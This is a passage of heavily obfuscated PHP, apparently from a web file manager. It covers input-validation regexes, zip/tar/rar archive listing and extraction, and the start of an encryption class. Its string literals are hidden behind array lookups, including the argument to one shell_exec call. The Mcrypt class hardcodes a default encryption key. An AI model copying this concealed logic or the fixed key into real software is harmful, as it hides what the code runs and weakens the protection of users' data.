$in[$DôÒİÜ„‘]; goto cÔÇ²Ñ¹; AÇÎ¢”×ŒÙ: if (!array_key_exists($DôÒİÜ„‘, $in)) { if (array_key_exists($B¼Ñ½‡†[1847], $F¬ÌäñÒµ‚)) { if (!is_null($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1847]])) { $DÖµÍ®öŸæ[$cÎ·ˆ—†œ] = $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1847]]; } } else { if (isset($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1848]])) { $Cöâ¨Àµº“[] = $b‹Ò´–ñá›; } } continue; } if (isset($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1848]]) && $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1848]] == $B¼Ñ½‡†[279]) { $EĞ¬µÚ¼š¥ = json_decode($in[$DôÒİÜ„‘], !0); if (is_array($EĞ¬µÚ¼š¥)) { $DÖµÍ®öŸæ[$cÎ·ˆ—†œ] = $EĞ¬µÚ¼š¥; } else { if (array_key_exists($B¼Ñ½‡†[1847], $F¬ÌäñÒµ‚)) { if (!is_null($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1847]])) { $DÖµÍ®öŸæ[$cÎ·ˆ—†œ] = $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1847]]; } } else { $Cöâ¨Àµº“[] = $b‹Ò´–ñá›; } } continue; } $cŞ˜Åä«àâ = _get($F¬ÌäñÒµ‚, $B¼Ñ½‡†[1003]); goto f»Ï««‚è†; cÔÇ²Ñ¹: } goto fÊĞã«íïá; dàñ²˜ÕÇ¸: } public static function reg($EğŞ²è§™³ = "\162\x65\161\165\x69\x72\x65") { static $bÔø”‡õÜ = array("\162\x65\161\165\x69\x72\145" => "\56\53", "\156\x75\x6d\142\x65\x72" => "\x5c\x64\53", "\x68\145\x78" => "\133\60\55\x39\x41\55\x46\141\55\x66\x5d\x2b", "\151\156\x74" => "\x5b\55\x5c\53\x5d\77\x5c\144\53", "\142\x6f\x6f\154" => "\x30\174\x31", "\146\x6c\x6f\141\x74" => "\133\55\x5c\53\x5d\x3f\x5c\144\53\50\x5c\x2e\x5c\x64\53\51\x3f", "\145\x6e\x67\x6c\151\163\x68" => "\133\x41\55\132\141\55\172\40\135\53", "\143\150\151\x6e\145\x73\x65" => "\x5b\x5c\170\173\x34\x65\x30\x30\x7d\55\134\170\173\71\146\x61\65\x7d\x5d\x2b", "\x68\141\163\x43\x68\x69\156\145\163\145" => "\57\50\133\134\170\x7b\64\x65\x30\60\x7d\x2d\x5c\170\173\x39\146\141\65\175\x5d\x2b\x29\57\165", "\x65\155\x61\x69\154" => "\x5c\x77\x2b\50\133\x5c\x2e\x5c\55\x5d\134\167\53\x29\52\134\x40\134\x77\53\x28\133\134\56\134\55\x5d\134\x77\53\x29\x2a\x5c\x2e\x5c\167\x2b", "\160\x68\157\156\x65" => "\x31\x5b\63\55\71\135\134\x64\173\71\x7d", "\164\145\x6c\x70\150\157\x6e\145" => "\50\134\x28\134\144\x7b\x33\54\x34\175\x5c\51\x7c\134\144\173\63\54\64\175\x2d\x7c\x5c\x73\51\77\x5c\144\x7b\x37\x2c\x31\64\x7d", "\x75\162\x6c" => "\x28\x68\x74\x74\x70\174\x66\164\160\174\x68\x74\164\x70\x73\x29\72\134\x2f\x5c\57\133\134\167\x5c\x2d\137\135\x2b\50\x5c\56\133\x5c\167\134\55\x5f\x5d\x2b\x29\x2b\50\133\x5c\167\134\55\134\x2e\54\x40\77\x5e\x3d\45\x26\x3a\x5c\57\176\x5c\53\x23\x5d\x2a\x5b\x5c\167\x5c\55\x5c\100\77\136\x3d\x25\46\x5c\57\x7e\x5c\x2b\x23\x5d\51\x3f", "\165\x72\154\106\x75\154\x6c" => "\133\141\55\172\x41\x2d\172\x5d\53\72\134\x2f\x5c\57\133\136\134\163\135\x2a", "\x69\160" => "\50\x5c\x64\173\x31\x2c\63\x7d\134\x2e\51\x7b\x33\175\x28\134\144\173\61\x2c\x33\x7d\x29", "\x7a\151\x70" => "\133\61\55\71\x5d\134\x64\x7b\65\175\50\77\x21\134\x64\51", "\151\144\103\x61\x72\x64" => "\50\x5c\144\x7b\x31\65\175\x29\174\x28\x5c\144\x7b\x31\67\175\50\134\x64\174\130\x7c\170\x29\x29", "\x63\x6f\154\x6f\x72" => "\43\50\x5b\x30\x2d\71\x41\x2d\x46\141\55\x66\x5d\173\63\175\174\x5b\x30\55\71\x41\55\x46\x61\x2d\x66\135\x7b\66\x7d\x29", "\x74\x69\x6d\145" => "\50\x5b\x30\x2d\x31\135\134\144\x7c\x32\133\x30\55\x34\135\x29\x3a\x5b\60\55\x35\x5d\x5c\x64", "\x64\141\164\145" => "\x5c\144\173\x34\175\x5b\55\134\x2f\135\77\x28\x30\133\x31\x2d\x39\135\x7c\x31\x5b\60\x2d\62\135\51\133\55\x5c\57\135\77\x28\133\x30\x2d\x32\x5d\x5c\144\x7c\63\x5b\x30\55\61\x5d\51", "\144\141\x74\145\x54\x69\155\x65" => "\x5c\144\x7b\x34\175\x5b\x2d\x5c\x2f\135\77\x28\x30\133\x31\x2d\71\135\174\61\x5b\60\x2d\62\x5d\51\133\55\134\57\135\77\x28\x5b\60\55\x32\135\x5c\x64\x7c\x33\133\x30\x2d\61\x5d\x29\134\x73\53\x28\133\x30\55\61\x5d\x5c\x64\174\x32\133\x30\55\x34\135\x29\72\133\60\x2d\65\135\134\x64", "\x70\141\163\x73\167\x6f\162\144" => "\50\x3f\x3d\56\x2a\x5c\144\51\50\77\x3d\56\52\x5b\141\55\172\135\51\x28\x3f\75\56\x2a\x5b\101\55\x5a\x5d\x29\56\x7b\x38\54\62\60\175", "\153\x65\x79" => "\133\101\55\x5a\x61\55\x7a\x30\x2d\x39\x5f\x5c\x2d\134\56\x5d\53", "\153\x65\x79\x46\165\154\154" => "\x5b\x41\x2d\x5a\x61\55\172\60\x2d\71\137\x5c\x2d\x5c\56\x5c\x73\54\135\53"); if (!$EğŞ²è§™³) { return $bÔø”‡õÜ; } return $bÔø”‡õÜ[$EğŞ²è§™³]; } public static function check($Eƒö½¹ÉÀ°, $d¸‡¬†Ò‹Í, $F¬ÊÊ“¸Ï = null) { $B¹¨Ù¼ƒò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; switch ($d¸‡¬†Ò‹Í) { case $B¹¨Ù¼ƒò[7]: return in_array($Eƒö½¹ÉÀ°, $F¬ÊÊ“¸Ï); break; case $B¹¨Ù¼ƒò[1850]: return floatval($Eƒö½¹ÉÀ°) > $F¬ÊÊ“¸Ï; break; case $B¹¨Ù¼ƒò[1851]: return floatval($Eƒö½¹ÉÀ°) < $F¬ÊÊ“¸Ï; break; case $B¹¨Ù¼ƒò[322]: return strlen($Eƒö½¹ÉÀ°) >= $F¬ÊÊ“¸Ï[0] && strlen($Eƒö½¹ÉÀ°) <= $F¬ÊÊ“¸Ï[1]; break; case $B¹¨Ù¼ƒò[322]: if (is_array($F¬ÊÊ“¸Ï)) { return strlen($Eƒö½¹ÉÀ°) >= $F¬ÊÊ“¸Ï[0] && strlen($Eƒö½¹ÉÀ°) <= $F¬ÊÊ“¸Ï[1]; break; } else { return strlen($Eƒö½¹ÉÀ°) == $F¬ÊÊ“¸Ï; break; } case $B¹¨Ù¼ƒò[318]: return floatval($Eƒö½¹ÉÀ°) >= $F¬ÊÊ“¸Ï[0] && floatval($Eƒö½¹ÉÀ°) <= $F¬ÊÊ“¸Ï[1]; break; } $bÀµĞ†Ò” = self::reg(!1); $d¸‡¬†Ò‹Í = isset($bÀµĞ†Ò”[$d¸‡¬†Ò‹Í]) ? $bÀµĞ†Ò”[$d¸‡¬†Ò‹Í] : $d¸‡¬†Ò‹Í; if (substr($d¸‡¬†Ò‹Í, 0, 1) != $B¹¨Ù¼ƒò[8]) { $d¸‡¬†Ò‹Í = $B¹¨Ù¼ƒò[1852] . $d¸‡¬†Ò‹Í . $B¹¨Ù¼ƒò[1853]; } return preg_match($d¸‡¬†Ò‹Í, $Eƒö½¹ÉÀ°) === 1; } public static function get($dÑÑÏÒòš’, $Cõİò·ç¦Ù = null, $BÏÖˆ÷ÚçÎ = null, $E‰îè¹ˆÇ = null) { goto AÁËæôêÓ„; AÁËæôêÓ„: $e¦Ú ›ØÕç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c¶Í‰˜™õ = array(); if (!is_null($BÏÖˆ÷ÚçÎ)) { $c¶Í‰˜™õ[$e¦Ú ›ØÕç[34]] = $BÏÖˆ÷ÚçÎ; } goto E¬…½ƒ“ôÙ; E¬…½ƒ“ôÙ: if (!is_null($E‰îè¹ˆÇ)) { $c¶Í‰˜™õ[$e¦Ú ›ØÕç[1003]] = $E‰îè¹ˆÇ; } if (!is_null($Cõİò·ç¦Ù)) { $c¶Í‰˜™õ[$e¦Ú ›ØÕç[1848]] = $Cõİò·ç¦Ù; } $cÕ’Û‘§Œ¦ = Input::getArray(array($dÑÑÏÒòš’ => $c¶Í‰˜™õ)); goto d½Ì™ß Í¢; d½Ì™ß Í¢: return $cÕ’Û‘§Œ¦[$dÑÑÏÒòš’]; goto b‹ñ ­™èˆ; b‹ñ ­™èˆ: } } class KodArchive { static function init() { goto a¸¨Õâõö†; E‰…¥¸Ó —: require_once ARCHIVE_LIB . $c©§¾†°«Ø[1862]; require_once ARCHIVE_LIB . $c©§¾†°«Ø[1863]; require_once ARCHIVE_LIB . $c©§¾†°«Ø[1864]; goto DéÀÚ¹à×ê; DéÀÚ¹à×ê: require_once ARCHIVE_LIB . $c©§¾†°«Ø[1865]; goto có­ª¾°—‘; F‰Î•‚îá¹: define($c©§¾†°«Ø[1856], TEMP_FILES); define($c©§¾†°«Ø[1857], TEMP_FILES); define($c©§¾†°«Ø[1858], $c©§¾†°«Ø[1859]); goto cá†Ø‰²‹¤; a¸¨Õâõö†: $c©§¾†°«Ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (defined($c©§¾†°«Ø[1854])) { return; } define($c©§¾†°«Ø[1854], SDK_DIR . $c©§¾†°«Ø[1855]); goto F‰Î•‚îá¹; cá†Ø‰²‹¤: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $c©§¾†°«Ø[1860]; require_once ARCHIVE_LIB . $c©§¾†°«Ø[1861]; goto E‰…¥¸Ó —; có­ª¾°—‘: } static function checkIfType($eæÕİÑê ´, $b‰ñã‘‘Îî) { goto aÇ´éğ˜ƒĞ; aÙŒ½™î±ˆ: return $f‚ÕÀ›×; goto C´Ø²Æâø‘; FŞ¨ºéöÚÄ: $f‚ÕÀ›× = in_array($eæÕİÑê ´, $CŸ¸‚İæ[$b‰ñã‘‘Îî]); if ($f‚ÕÀ›× && ($b‰ñã‘‘Îî == $A´°âÇì÷´[298] || $b‰ñã‘‘Îî == $A´°âÇì÷´[1869]) && (!function_exists($A´°âÇì÷´[1877]) || !function_exists($A´°âÇì÷´[1878]))) { show_tips($A´°âÇì÷´[1879]); } if ($f‚ÕÀ›× && $b‰ñã‘‘Îî == $A´°âÇì÷´[1037] && (!function_exists($A´°âÇì÷´[1880]) || !strstr(shell_exec($A´°âÇì÷´[1881]), $A´°âÇì÷´[1882]))) { show_tips($A´°âÇì÷´[1883]); } goto aÙŒ½™î±ˆ; aÇ´éğ˜ƒĞ: $A´°âÇì÷´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); $CŸ¸‚İæ = array($A´°âÇì÷´[298] => array($A´°âÇì÷´[298], $A´°âÇì÷´[1866], $A´°âÇì÷´[1867], $A´°âÇì÷´[1868]), $A´°âÇì÷´[1869] => array($A´°âÇì÷´[1869], $A´°âÇì÷´[1870], $A´°âÇì÷´[1035], $A´°âÇì÷´[1033]), $A´°âÇì÷´[1037] => array($A´°âÇì÷´[1037], $A´°âÇì÷´[1871], $A´°âÇì÷´[1872], $A´°âÇì÷´[1873], $A´°âÇì÷´[1874], $A´°âÇì÷´[1875], $A´°âÇì÷´[1876])); goto FŞ¨ºéöÚÄ; C´Ø²Æâø‘: } static function listContent($DÙÓÕ©Ô¹, $dê™¬ÔˆËŠ = true) { $D“°ĞåßŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); $C±‹ãÌ×£Ş = !empty($GLOBALS[$D“°ĞåßŒ[1041]]) ? $GLOBALS[$D“°ĞåßŒ[1041]] : get_path_ext($DÙÓÕ©Ô¹); $e¿Œîµå¬ = !1; if (self::checkIfType($C±‹ãÌ×£Ş, $D“°ĞåßŒ[1869])) { $Cá±‚Ï¸ƒÇ = PclTarList($DÙÓÕ©Ô¹, $C±‹ãÌ×£Ş); $e¿Œîµå¬ = array(); for ($b¹‰¢Ç¶Úµ = 0; $b¹‰¢Ç¶Úµ < count($Cá±‚Ï¸ƒÇ); $b¹‰¢Ç¶Úµ++) { $bòŒˆ‹òæ = $Cá±‚Ï¸ƒÇ[$b¹‰¢Ç¶Úµ]; if ($bòŒˆ‹òæ[$D“°ĞåßŒ[1884]] == $D“°ĞåßŒ[1885] || $bòŒˆ‹òæ[$D“°ĞåßŒ[1884]] == $D“°ĞåßŒ[1886]) { continue; } if ($dê™¬ÔˆËŠ) { $bòŒˆ‹òæ[$D“°ĞåßŒ[1887]] = ltrim($bòŒˆ‹òæ[$D“°ĞåßŒ[1887]], $D“°ĞåßŒ[1139]); } if ($bòŒˆ‹òæ[$D“°ĞåßŒ[1884]] == $D“°ĞåßŒ[1888]) { $bòŒˆ‹òæ[$D“°ĞåßŒ[76]] = !0; } else { $bòŒˆ‹òæ[$D“°ĞåßŒ[76]] = !1; } $bòŒˆ‹òæ[$D“°ĞåßŒ[1028]] = $b¹‰¢Ç¶Úµ; $e¿Œîµå¬[] = $bòŒˆ‹òæ; } } else { if (self::checkIfType($C±‹ãÌ×£Ş, $D“°ĞåßŒ[1037])) { $D‡†ö°¿é¢ = kodRarArchive::listContent($DÙÓÕ©Ô¹); if (!$D‡†ö°¿é¢[$D“°ĞåßŒ[1024]]) { return $D‡†ö°¿é¢; } else { $e¿Œîµå¬ = $D‡†ö°¿é¢[$D“°ĞåßŒ[1026]]; } } else { if (kodZipArchive::support($D“°ĞåßŒ[351])) { $e¿Œîµå¬ = kodZipArchive::listContent($DÙÓÕ©Ô¹); } else { $e„¯Ïë¯™£ = new PclZip($DÙÓÕ©Ô¹); $e¿Œîµå¬ = $e„¯Ïë¯™£->listContent(); } } } if ($e¿Œîµå¬) { $f´ä›»¸©ñ = unzip_charset_get($e¿Œîµå¬); $dê™¬ÔˆËŠ = $dê™¬ÔˆËŠ && function_exists($D“°ĞåßŒ[65]); for ($b¹‰¢Ç¶Úµ = 0; $b¹‰¢Ç¶Úµ < count($e¿Œîµå¬); $b¹‰¢Ç¶Úµ++) { $e¿Œîµå¬[$b¹‰¢Ç¶Úµ][$D“°ĞåßŒ[1887]] = str_replace(array($D“°ĞåßŒ[1064], $D“°ĞåßŒ[1889]), $D“°ĞåßŒ[757], $e¿Œîµå¬[$b¹‰¢Ç¶Úµ][$D“°ĞåßŒ[1887]]); if ($dê™¬ÔˆËŠ) { $e¿Œîµå¬[$b¹‰¢Ç¶Úµ][$D“°ĞåßŒ[1887]] = iconv_to($e¿Œîµå¬[$b¹‰¢Ç¶Úµ][$D“°ĞåßŒ[1887]], $f´ä›»¸©ñ, $D“°ĞåßŒ[323]); unset($e¿Œîµå¬[$b¹‰¢Ç¶Úµ][$D“°ĞåßŒ[1890]]); } } return array($D“°ĞåßŒ[1024] => !0, $D“°ĞåßŒ[1026] => $e¿Œîµå¬); } else { return array($D“°ĞåßŒ[1024] => !1, $D“°ĞåßŒ[1026] => $e¿Œîµå¬); } } static function extract($A¢ÚàŠ¾ƒ…, $Eõœ†Š, $c¸À™…ã‹Õ = "\x2d\x31", &$d‘§íÆ»³ğ = false) { goto A¸İ×ù™¡ø; a¤éÑÍ¸: $b˜ËÁ¸§‚¡ = self::listContent($A¢ÚàŠ¾ƒ…, !1); if (!$b˜ËÁ¸§‚¡[$BÚôè£Ñ›¿[1024]]) { return $b˜ËÁ¸§‚¡; } if ($c¸À™…ã‹Õ != $BÚôè£Ñ›¿[1023]) { goto DĞ“¾£ ¤—; aôø¦ğ: if ($GLOBALS[$BÚôè£Ñ›¿[6]][$BÚôè£Ñ›¿[1137]] != $BÚôè£Ñ›¿[323]) { $f²á„î»ò† = unzip_pre_name($d‘§íÆ»³ğ); } $Dëœ½‹õÌô = get_path_father($d‘§íÆ»³ğ); if ($Dëœ½‹õÌô == $d‘§íÆ»³ğ) { $Dëœ½‹õÌô = $BÚôè£Ñ›¿[33]; } goto d¶Ôïğ˜À½; DĞ“¾£ ¤—: $f™»”ä©‰ = self::fileIndex($b˜ËÁ¸§‚¡[$BÚôè£Ñ›¿[1026]], $c¸À™…ã‹Õ); $d‘§íÆ»³ğ = str_replace(array($BÚôè£Ñ›¿[1064], $BÚôè£Ñ›¿[1889]), $BÚôè£Ñ›¿[70], $f™»”ä©‰[$BÚôè£Ñ›¿[1887]]); $f²á„î»ò† = $d‘§íÆ»³ğ; goto aôø¦ğ; d¶Ôïğ˜À½: if ($f™»”ä©‰[$BÚôè£Ñ›¿[76]]) { $f²á„î»ò† = rtrim($f²á„î»ò†, $BÚôè£Ñ›¿[8]) . $BÚôè£Ñ›¿[8]; $d‘§íÆ»³ğ = array($d‘§íÆ»³ğ); } $E£´Úƒïß” = str_replace($BÚôè£Ñ›¿[95], $BÚôè£Ñ›¿[8], $f²á„î»ò†); if (substr($E£´Úƒïß”, -1) == $BÚôè£Ñ›¿[8]) { if (!strstr(trim($E£´Úƒïß”, $BÚôè£Ñ›¿[8]), $BÚôè£Ñ›¿[8])) { $Eõœ†Š = $Eõœ†Š . get_path_this($E£´Úƒïß”) . $BÚôè£Ñ›¿[8]; } } else { if ($Dëœ½‹õÌô == $f²á„î»ò†) { $Dëœ½‹õÌô = $BÚôè£Ñ›¿[33]; } } goto aó¯­¢¼¿; aó¯­¢¼¿: } goto dØÊ¶Ù¥‚; dØÊ¶Ù¥‚: if (self::checkIfType($cÂÆØ‹î¹ã, $BÚôè£Ñ›¿[1869])) { if ($c¸À™…ã‹Õ != $BÚôè£Ñ›¿[1023]) { $f²á„î»ò† = unzip_pre_name($f²á„î»ò†); $Dëœ½‹õÌô = unzip_pre_name($Dëœ½‹õÌô); $d¹Ë©À®ˆ = PclTarExtractList($A¢ÚàŠ¾ƒ…, array($f²á„î»ò†), $Eõœ†Š, $Dëœ½‹õÌô, $cÂÆØ‹î¹ã); } else { $d¹Ë©À®ˆ = PclTarExtract($A¢ÚàŠ¾ƒ…, $Eõœ†Š, $BÚôè£Ñ›¿[358], $cÂÆØ‹î¹ã); } return array($BÚôè£Ñ›¿[1024] => $d¹Ë©À®ˆ, $BÚôè£Ñ›¿[1026] => PclErrorString(!0)); } else { if (self::checkIfType($cÂÆØ‹î¹ã, $BÚôè£Ñ›¿[1037])) { return kodRarArchive::extract($A¢ÚàŠ¾ƒ…, $Eõœ†Š, $cÂÆØ‹î¹ã, $d‘§íÆ»³ğ); } else { if (kodZipArchive::support($BÚôè£Ñ›¿[1891])) { return kodZipArchive::extract($A¢ÚàŠ¾ƒ…, $Eõœ†Š, $d‘§íÆ»³ğ); } else { $cÕßŠàÁƒ£ = new PclZip($A¢ÚàŠ¾ƒ…); if ($c¸À™…ã‹Õ != $BÚôè£Ñ›¿[1023]) { $d¹Ë©À®ˆ = $cÕßŠàÁƒ£->extract(PCLZIP_OPT_PATH, $Eõœ†Š, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $BÚôè£Ñ›¿[1892], PCLZIP_OPT_BY_NAME, $f™»”ä©‰[$BÚôè£Ñ›¿[1887]], PCLZIP_OPT_REMOVE_PATH, $Dëœ½‹õÌô, PCLZIP_OPT_REPLACE_NEWER); } else { $d¹Ë©À®ˆ = $cÕßŠàÁƒ£->extract(PCLZIP_OPT_PATH, $Eõœ†Š, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $BÚôè£Ñ›¿[1892], PCLZIP_OPT_REPLACE_NEWER); } return array($BÚôè£Ñ›¿[1024] => $d¹Ë©À®ˆ, $BÚôè£Ñ›¿[1026] => $cÕßŠàÁƒ£->errorName(!0)); } } } return array($BÚôè£Ñ›¿[1024] => !1, $BÚôè£Ñ›¿[1026] => $BÚôè£Ñ›¿[1893]); goto F£èŠİ–ß³; A¸İ×ù™¡ø: $BÚôè£Ñ›¿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); $cÂÆØ‹î¹ã = !empty($GLOBALS[$BÚôè£Ñ›¿[1041]]) ? $GLOBALS[$BÚôè£Ñ›¿[1041]] : get_path_ext($A¢ÚàŠ¾ƒ…); goto a¤éÑÍ¸; F£èŠİ–ß³: } static function fileIndex($eÈ’šÉÍ†, $f®Ø†—Í—é, $d¨æê˜Õ¾¸ = false) { goto eÂÇù‹¬¼; eÂÇù‹¬¼: $a„ĞŠ÷ÈÜ­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); if (!is_array($eÈ’šÉÍ†)) { return !1; } goto D¡¹º‘‡±; D‡ôµºáÛ¼: $eùÉµ‡‰„Ü = $fåÒÊÅ§‘å; if ($d¨æê˜Õ¾¸) { $eùÉµ‡‰„Ü = $fåÒÊÅ§‘å[$d¨æê˜Õ¾¸]; if ($fåÒÊÅ§‘å[$a„ĞŠ÷ÈÜ­[76]]) { $eùÉµ‡‰„Ü = rtrim($eùÉµ‡‰„Ü, $a„ĞŠ÷ÈÜ­[8]) . $a„ĞŠ÷ÈÜ­[8]; } } return $eùÉµ‡‰„Ü; goto dª“ ÷¦Å÷; D¡¹º‘‡±: $dù±ª­²“ = count($eÈ’šÉÍ†); for ($DÎÊ‘ò‚Šé = 0; $DÎÊ‘ò‚Šé < $dù±ª­²“; $DÎÊ‘ò‚Šé++) { if ($f®Ø†—Í—é == $eÈ’šÉÍ†[$DÎÊ‘ò‚Šé][$a„ĞŠ÷ÈÜ­[1028]]) { $fåÒÊÅ§‘å = $eÈ’šÉÍ†[$DÎÊ‘ò‚Šé]; break; } } if (!$fåÒÊÅ§‘å) { show_tips($a„ĞŠ÷ÈÜ­[1894]); } goto D‡ôµºáÛ¼; dª“ ÷¦Å÷: } static function extractZipFile($EğòŸİÅì², $D³Ğ›™½¢, $e‹ãÌ¤¤ = false) { goto bñÂ‚¾çÙí; bñÂ‚¾çÙí: $dßíëğ°¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); $f Ñ´øÏ§Ó = TEMP_FILES . hash_path($EğòŸİÅì²) . $dßíëğ°¹[8]; goto AğĞ‹²Óğå; c­“Äèæ³: if (!file_exists($e§Œ¯Õ§Ÿ°)) { return !1; } @rename($e§Œ¯Õ§Ÿ°, $cŒÁõí¹Äƒ); return $cŒÁõí¹Äƒ; goto bé…‡Õ®ç; AğĞ‹²Óğå: mk_dir($f Ñ´øÏ§Ó); $cŒÁõí¹Äƒ = $f Ñ´øÏ§Ó . md5($EğòŸİÅì² . $D³Ğ›™½¢); if ($e‹ãÌ¤¤) { $cŒÁõí¹Äƒ = $f Ñ´øÏ§Ó . $e‹ãÌ¤¤; } goto aÒèª¼ñ¢; aÒèª¼ñ¢: if (file_exists($cŒÁõí¹Äƒ)) { return $cŒÁõí¹Äƒ; } $F¼‰ßã­ë = new PclZip($EğòŸİÅì²); $e§Œ¯Õ§Ÿ° = unzip_filter_ext($f Ñ´øÏ§Ó . get_path_this($D³Ğ›™½¢)); goto Fôß¶öš±¤; Fôß¶öš±¤: $e‹ƒÎˆ«¬İ = get_path_father($D³Ğ›™½¢); if ($e‹ƒÎˆ«¬İ == $D³Ğ›™½¢) { $e‹ƒÎˆ«¬İ = $dßíëğ°¹[33]; } $aÌø×‚¤³ = $F¼‰ßã­ë->extract(PCLZIP_OPT_PATH, $f Ñ´øÏ§Ó, PCLZIP_CB_PRE_FILE_NAME, $dßíëğ°¹[1892], PCLZIP_OPT_REMOVE_PATH, $e‹ƒÎˆ«¬İ, PCLZIP_OPT_BY_NAME, $D³Ğ›™½¢); goto c­“Äèæ³; bé…‡Õ®ç: } static function filePreview($d›öÌºáá³, $cçÍÇ½ŒîÕ, $c­ÇÄÙ‹â = false, $C¤º¯ÖŠÙ = false) { goto Eö¹ÁÒÔİ; bšÙ‰‘ëª‘: $f¦µ¶†¡ùª = unzip_pre_name($f¦µ¶†¡ùª); $a‚íœÍ£¦± = get_path_this($f¦µ¶†¡ùª); $f‹•ø”·œí = unzip_filter_ext($b’ƒª”Õ” . $a‚íœÍ£¦±); goto b¥÷†ŞóØø; Eö¹ÁÒÔİ: $c—ùÙÔ‡„È =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); $b’ƒª”Õ” = TEMP_FILES . hash_path($d›öÌºáá³) . $c—ùÙÔ‡„È[8]; goto fÈÃ¡Ÿˆ; fÈÃ¡Ÿˆ: mk_dir($b’ƒª”Õ”); $E½îëœÅ = $b’ƒª”Õ” . md5($d›öÌºáá³ . $cçÍÇ½ŒîÕ . $C¤º¯ÖŠÙ); $f¦µ¶†¡ùª = $c—ùÙÔ‡„È[33]; goto BİÛÉ¶‹÷â; DĞŸ µÅ¬˜: if (!file_exists($E½îëœÅ)) { del_dir($b’ƒª”Õ”); show_json($c—ùÙÔ‡„È[1897]); } IO::fileOut($E½îëœÅ, $c­ÇÄÙ‹â, $a‚íœÍ£¦±); goto Báï£ˆªÖ¹; b¥÷†ŞóØø: if (!$fÎšËó¨†´[$c—ùÙÔ‡„È[1024]]) { show_json($fÎšËó¨†´[$c—ùÙÔ‡„È[1026]], !1); } if (!file_exists($f‹•ø”·œí)) { show_json($c—ùÙÔ‡„È[1896], !1); } @rename($f‹•ø”·œí, $E½îëœÅ); goto DĞŸ µÅ¬˜; BİÛÉ¶‹÷â: $fÎšËó¨†´ = self::extract($d›öÌºáá³, $b’ƒª”Õ”, $cçÍÇ½ŒîÕ, $f¦µ¶†¡ùª); if (is_array($f¦µ¶†¡ùª)) { show_json($c—ùÙÔ‡„È[1895], !1); } if (file_exists($E½îëœÅ)) { IO::fileOut($E½îëœÅ, $c­ÇÄÙ‹â, get_path_this($f¦µ¶†¡ùª)); return; } goto bšÙ‰‘ëª‘; Báï£ˆªÖ¹: } static function create($Fßæ Êø‘¼, $b£ÁöáÕïÁ) { $Fù©¾ĞÓËº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::init(); $FÈ¿‚ñ™Ø = get_path_ext($Fßæ Êø‘¼); $EÃÖ«¨æ à = !1; if (self::checkIfType($FÈ¿‚ñ™Ø, $Fù©¾ĞÓËº[298])) { if (kodZipArchive::support($Fù©¾ĞÓËº[1002])) { return kodZipArchive::create($Fßæ Êø‘¼, $b£ÁöáÕïÁ); } $e£¯ºë˜ Œ = new PclZip($Fßæ Êø‘¼); foreach ($b£ÁöáÕïÁ as $D·¥ù†ÙÚŸ => $bÏ÷¹æŠñ±) { $bÏ÷¹æŠñ± = str_replace($Fù©¾ĞÓËº[463], $Fù©¾ĞÓËº[8], $bÏ÷¹æŠñ±); $b•„ïÉê‰Õ = Kodio::clear(get_path_father($bÏ÷¹æŠñ±)); if ($D·¥ù†ÙÚŸ == 0) { $EÃÖ«¨æ à = $e£¯ºë˜ Œ->create($bÏ÷¹æŠñ±, PCLZIP_OPT_REMOVE_PATH, $b•„ïÉê‰Õ, PCLZIP_CB_PRE_FILE_NAME, $Fù©¾ĞÓËº[1898]); continue; } $EÃÖ«¨æ à = $e£¯ºë˜ Œ->add($bÏ÷¹æŠñ±, PCLZIP_OPT_REMOVE_PATH, $b•„ïÉê‰Õ, PCLZIP_CB_PRE_FILE_NAME, $Fù©¾ĞÓËº[1898]); } } else { if (self::checkIfType($FÈ¿‚ñ™Ø, $Fù©¾ĞÓËº[1869])) { foreach ($b£ÁöáÕïÁ as $D·¥ù†ÙÚŸ => $bÏ÷¹æŠñ±) { $bÏ÷¹æŠñ± = str_replace($Fù©¾ĞÓËº[463], $Fù©¾ĞÓËº[8], $bÏ÷¹æŠñ±); $b•„ïÉê‰Õ = Kodio::clear(get_path_father($bÏ÷¹æŠñ±)); if ($D·¥ù†ÙÚŸ == 0) { $EÃÖ«¨æ à = PclTarCreate($Fßæ Êø‘¼, array($bÏ÷¹æŠñ±), $FÈ¿‚ñ™Ø, null, $b•„ïÉê‰Õ); continue; } $EÃÖ«¨æ à = PclTarAddList($Fßæ Êø‘¼, array($bÏ÷¹æŠñ±), $Fù©¾ĞÓËº[33], $b•„ïÉê‰Õ, $FÈ¿‚ñ™Ø); } } } return $EÃÖ«¨æ à; } } class Mcrypt { public static $defaultKey = "\141\41\164\x61\x6b\101\x3a\x64\x6c\x6d\x63\x6c\144\x45\x76\x2c\x65"; public static function encode($DÊ›Ù¡Æ•, $e‹­ÒöƒŒ¥ = '', $F¬»Œ®éÍ™ = 0, $FÔÓæçò¯ô = '') { goto CçïÕÜ¹Ç®; fğÊñ©‘„¡: $eŸäà‹ÛŒ = md5(substr($e‹­ÒöƒŒ¥, 0, 16)); $Fâáğ†ô‰ = md5(substr($e‹­ÒöƒŒ¥, 16, 16)); $FÔÓæçò¯ô = $FÔÓæçò¯ô ? $FÔÓæçò¯ô : md5(microtime()); goto EùÆÚšØ³ˆ; cáçÒñÂø: $DÊ›Ù¡Æ• = sprintf($D—¬Ï‚°¼[1899], $F¬»Œ®éÍ™ ? $F¬»Œ®éÍ™ + time() : 0) . substr(md5($DÊ›Ù¡Æ• . $Fâáğ†ô‰), 0, 16) . $DÊ›Ù¡Æ•; $d‚÷²å¡¼º = strlen($DÊ›Ù¡Æ•); 